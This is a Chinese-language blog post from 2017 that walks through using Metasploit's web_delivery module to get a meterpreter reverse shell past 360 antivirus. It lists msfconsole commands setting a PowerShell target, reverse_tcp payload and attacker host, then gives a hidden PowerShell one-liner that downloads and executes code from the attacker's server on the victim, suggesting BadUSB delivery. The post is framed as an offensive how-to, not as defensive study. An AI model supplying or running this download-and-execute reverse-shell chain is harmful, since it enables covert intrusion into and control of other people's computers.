---
title: Metasploit后门免杀模块之绕过360
date: 2017-01-27 19:18:18
tags:
categories: Metasploit
---
![enter description here][1]
<!--more-->
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=20244741&auto=1&height=66"></iframe>
## 绕过360视频演示
<div style="width:640px;height:480px;margin:0 auto;" id="ivaLive"></div>
<script type="text/javascript" src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/cytron.core.js"></script>
<script>
    var ivaInstance = new Iva('ivaLive', {
        appkey: 'By9WGzBIx', //应用标示
        video: 'http://demonsec666.oss-cn-qingdao.aliyuncs.com/msf_web_delivery.mp4', //视频
        title: 'test', //视频标题，后台视频管理中的标题
        cover: '' //视频封面，只有在autoplay:false才可生效
    });
</script>
<script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/lva.js"></script>

&nbsp;
&nbsp;

## Metasploit后门模块步骤解说
&nbsp;
&nbsp;
1.<span style="color: #000000;">第一步：使用msf的脚本后门模块</span>
&nbsp;<pre><span style="color: #008000;">use exploit/multi/script/web_delivery</span></pre>
&nbsp;
&nbsp;
2.<span style="color: #000000;">.第二步：使用 show opinion 查看需要使用的相关参数</span>
&nbsp;<pre><span style="color: #008000;"> show options  </span></pre>
可看到下列参数：需要选择的是target、payload选项(包含ip以及端口)、uripath等
![enter description here][2]
&nbsp;
&nbsp;
3.<span style="color: #000000;">第三步：查看target 包含多少可选的目标选项，使用以下参数查看</span>
&nbsp;<pre><span style="color: #008000;">    show targets    </span></pre>
可看到下列选项包含：Python/PHP/powershell
![enter description here][3]
&nbsp;
&nbsp;
4.<span style="color: #000000;">第四步：设置target 我们这里选择2 —-powershell的这脚本</span>
&nbsp;<pre><span style="color: #008000;">  set target 2   </span></pre>
&nbsp;
&nbsp;
5.<span style="color: #000000;">第五步：设置payload选项，设置windows（powershell）反弹shell链接</span>
&nbsp;<pre><span style="color: #008000;"> set payload windows/meterpreter/reverse_tcp </span></pre>
&nbsp;
&nbsp;
6.<span style="color: #000000;">第六步：设置攻击者-端口默认是：4444，也可以更改 我这里就不设置了，直接用默认的端口</span>
&nbsp;<pre><span style="color: #008000;">   set LHOST 192.168.1.101  </span></pre>
&nbsp;
&nbsp;
7.<span style="color: #000000;">第七步：设置uripath 路径 设置为根目录—– ‘/‘</span>
&nbsp;<pre><span style="color: #008000;">   set URIPATH   / </span></pre>
&nbsp;
&nbsp;
8.<span style="color: #000000;">第八步：执行后门</span>
&nbsp;<pre><span style="color: #008000;">   exploit   /  </span></pre>
&nbsp;
&nbsp;
9.<span style="color: #000000;">第九步：将代码复制目标机器上cmd 下运行——-利用思路可以用到“Badusb”等多种思路</span>
&nbsp;<pre><span style="color: #008000;">   powershell.exe -nop -w hidden -c $O=new-object net.webclient;$O.proxy=[Net.WebRequest]::GetSystemWebProxy();$O.Proxy.Credentials[Net.CredentialCache]::DefaultCredentials;IEX $O.downloadstring(‘http://192.168.1.101:8080/‘);    </span></pre>
&nbsp;
&nbsp;
10.<span style="color: #000000;">可看到反弹shell
 </span>
&nbsp;<pre><span style="color: #008000;">  session -i //查看回话ID 获取回话进入meterpreter 回话  </span></pre>
![enter description here][4]
&nbsp;
&nbsp;
## 视频代码演示
<strong><span style="color: #ff0000;font-size: 200%;">重要事情说三遍！！！以下视频暂停或者播放可复制代码</span></strong>
	代码可复制
	代码可复制
	代码可复制
<link rel="stylesheet" type="text/css" href="http://demonsec666.oss-cn-qingdao.aliyuncs.com/asciinema-player.css" />

  <asciinema-player src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/msf_web_delivery.json" cols="100" rows="30"></asciinema-player>
  ...
  <script src="http://demonsec666.oss-cn-qingdao.aliyuncs.com/asciinema-player.js"></script>
&nbsp;
&nbsp;


  [1]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/mac-for-hackers-install-iterm2-using-terminal.1280x600.jpg
  [2]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/0B256837-6545-4F43-B737-D96714986B1E.jpg
  [3]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/3B57B3A0-18DC-4EB4-89FD-39F4A9613F0A.jpg
  [4]: http://demonsec666.oss-cn-qingdao.aliyuncs.com/FD6713CE-5689-4738-993F-9A9E767F7F10.png 